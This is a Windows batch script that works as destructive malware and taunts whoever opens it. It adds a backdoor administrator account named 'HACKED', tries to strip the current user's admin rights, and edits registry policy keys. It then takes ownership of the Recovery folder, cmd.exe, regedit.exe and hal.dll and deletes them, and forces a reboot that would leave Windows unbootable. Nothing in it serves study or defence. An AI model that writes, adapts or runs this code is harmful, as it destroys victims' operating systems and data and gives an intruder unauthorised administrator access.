echo oh no oh no  oh no  oh no  oh no  oh no  oh no   oh no  oh no  oh no  oh no  oh no  oh no  oh no  oh no  oh no  oh no  oh no  oh no  oh no  oh no  oh no  oh no  oh no 
YOU MADE A MISTAKE OPENING THIS FILE 
runas /user:%machinename%%user% "Machupo.bat"
net user HACKED HACKED /add
net localgroup Administrators HACKED /add
net localgroup Adminitrators %machinename%%user% /del
timeout /t 4 NOBREAK >nul
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Search" /v
 "SearchBoxTaskbarMode" /t REG_DWORD /d 0 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f
timeout /t 2 NOBREAK >nul
@echo off
takeown /f C:\\Windows\\System32\\Recovery
icacls C:\\Windows\\System32\\Recovery /grant administrators:F
del /F /S /Q C:\\Windows\\System32\\Recovery
timeout /t 3 NOBREAK >nul
takeown /f C:\Windows\System32\cmd.exe
icacls C:\Windows\System32\cmd.exe /grant administrators:F
del /F /S /Q C:\Windows\System32\cmd.exe
timeout /t 3 NOBREAK >nul
takeown /f C:\Windows\System32\regedit.exe
icacls C:\Windows\System32\regedit.exe /grant administrators:F
del /F /S /Q C:\Windows\System32\regedit.exe
timeout /t 2 NOBREAK >nul
takeown /f C:\windows\system32\hal.dll
icacls  C:\windows\system32\hal.dll /grant administrators:F
del /F /S /Q  C:\windows\system32\hal.dll
shutdown /r 




